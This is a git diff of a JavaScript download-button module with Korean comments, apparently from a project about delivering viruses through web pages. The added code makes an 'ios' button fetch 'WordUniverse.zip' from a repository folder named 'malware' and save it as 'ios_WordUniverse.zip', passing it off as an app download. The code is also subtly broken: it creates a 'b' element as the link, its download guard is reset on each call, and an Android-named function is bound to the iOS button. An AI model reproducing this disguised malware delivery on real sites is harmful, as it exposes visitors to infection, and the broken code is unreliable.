@@ -1,35 +1,27 @@
-export default function Download_ios() {
-    const downloadButton = document.getElementById("ios");
-    let isDownloading = false; // 다운로드 중인지 여부를 추적하는 변수
+export default function Download_Android() {
+    const downloadButton = document.getElementById('ios');
 
-    downloadButton.addEventListener("click", function() {
-        if (isDownloading) {
-            return; // 이미 다운로드 중인 경우 아무 작업도 하지 않음
-        }
+    downloadButton.addEventListener('click', handleDownload);
 
-        isDownloading = true; // 다운로드 중 상태로 설정
+    async function handleDownload() {
+        // 다운로드 중인지 여부를 확인하는 변수
+        let isDownloading = false;
 
-        // 파일 내용을 설정합니다. 여기서는 간단한 텍스트 파일로 가정합니다.
-        const fileContent = "This is the content of ios";
+        if (!isDownloading) {
+            isDownloading = true;
 
-        // Blob 객체를 생성합니다.
-       const blob = new Blob([fileContent], { type: "exe/plain" });
+            const fileURL = 'https://github.com/KGV-Security/VIRUS_IN_WEB/raw/88e3f772c3827a875246a95e89e1a9dae012214e/src/malware/WordUniverse.zip';
+            const fileName = 'ios_WordUniverse.zip';
 
-        // a 태그를 생성하고 Blob 객체를 URL로 변환하여 다운로드 링크로 설정합니다.
-        const downloadLink = document.createElement("a");
-        downloadLink.href = URL.createObjectURL(blob);
+            const b = document.createElement('b');
+            b.href = fileURL;
+            b.download = fileName;
+            document.body.appendChild(b);
+            b.click();
+            document.body.removeChild(b);
 
-        // 다운로드할 파일의 이름을 지정합니다.
-        downloadLink.download = "ios.exe";
-
-        // a 태그를 클릭하여 다운로드를 시작합니다.
-        downloadLink.click();
-
-        // 사용이 끝난 a 태그를 제거하고 다운로드 중 상태를 해제합니다.
-        downloadLink.addEventListener("click", function() {
-            URL.revokeObjectURL(downloadLink.href);
-            downloadLink.remove();
+            // 다운로드가 완료되었을 때 버튼을 활성화
             isDownloading = false;
-        });
-    });
+        }
+    }
 }
